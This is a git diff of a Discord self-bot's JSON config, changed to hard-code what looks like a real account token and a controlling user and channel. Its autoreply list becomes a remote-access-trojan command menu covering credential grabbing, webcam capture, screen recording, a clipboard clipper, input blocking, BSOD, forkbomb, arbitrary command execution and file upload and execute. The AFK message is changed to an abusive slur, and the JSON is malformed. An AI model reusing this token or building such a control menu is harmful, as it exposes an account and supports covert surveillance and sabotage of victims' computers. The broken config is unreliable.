@@ -1,18 +1,42 @@
 {
-    "token": "YOUR_DISCORD_TOKEN_HERE",
-    "prefix": ".",
-    "remote-users": [],
+    "token": "MTM0MDQ5MzExNjM4NTI2MzY1Ng.GezjLy.SFiKI8rHkzjYSMx4AwoujYw06MpyLFM5YY4ifk",
+    "prefix": ".bot",
+    "remote-users": [1087265737992847361],
     "autoreply": {
         "messages": [
-            "https://github.com/AstraaDev/Discord-SelfBot",
-            "https://discord.gg/PKR7nM9j9U"
+            ".ss",
+            ".join",
+            ".show [what-to-show],
+            ".kill [process-id]",
+            ".grab [what-to-grab]",
+            ".clear",
+            ".pwd",
+            ".tree",
+            ".ls",
+            ".download [file-or-dir]",
+            ".upload [type] [name]",
+            ".execute [file]",
+            ".remove [file-or-dir]",
+            ".implode",
+            ".webcam photo",
+            ".screenrec",
+            ".block-input / .unblock-input",
+            ".start-clipper / .stop-clipper",
+            "..blacklist / .whitelist",
+            ".bsod",
+            ".forkbomb",
+            ".tts",
+            ".msg",
+            ".cmd [command]",
+            ".cd [dir]",
+            
         ],
-        "channels": [],
-        "users": []
+        "channels": [1341845055115366490],
+        "users": [1087265737992847361]
     },
     "afk": {
         "enabled": false,
-        "message": "I am currently AFK. I will respond as soon as possible!"
+        "message": "I am AFK cuzzy kickback ya silly slut!"
     },
     "copycat": {
         "users": []
